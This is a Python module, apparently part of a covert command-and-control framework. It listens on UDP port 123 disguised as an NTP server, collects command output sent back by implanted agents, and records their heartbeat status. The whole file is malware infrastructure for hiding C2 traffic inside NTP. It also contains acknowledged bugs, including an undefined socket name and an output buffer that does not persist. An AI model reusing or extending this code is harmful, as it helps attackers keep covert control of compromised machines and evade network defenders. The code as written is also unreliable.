"""
sole purpose is to listen consistenty for NTP traffic
if resync is recieved, send to ntpserver.py
if cmdoutput is received, send to c2.py
"""
import socket
import datetime
from threading import Thread

from server import ntpserver, c2


def start(agentDB):
    
    serverip = "0.0.0.0"
    port = 123

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((serverip, port))


    datahold = ""
    while True:
        data, addr = sock.recvfrom(2048)
        thread = Thread(target=handle, args=[data, addr, sock, agentDB, datahold], daemon=True)
        thread.start()        


    s.close()


def handle(data, addr, sock, agentDB, datahold):
    ip = addr[0]

    strdata = c2.decode(data)

    if "COM" in strdata: #TODO fix this hsit later, datahold broken and  handling of multiple COMOs (ex. sending command to multiple sources and receiving output?)???
        idx = strdata.index("COM")
        datahold += strdata[idx+4:]
        if "COMQ" in strdata:
            c2.printOutput(datahold, ip)
            datahold = "" #return this?

    else: #this means resync/ping
        ntpserver.resync(sock, data, addr)
        timestamp = "{:%Y-%m-%d %H:%M:%S}".format(datetime.datetime.now())
        agentDB.aliveStatus(ip, timestamp)


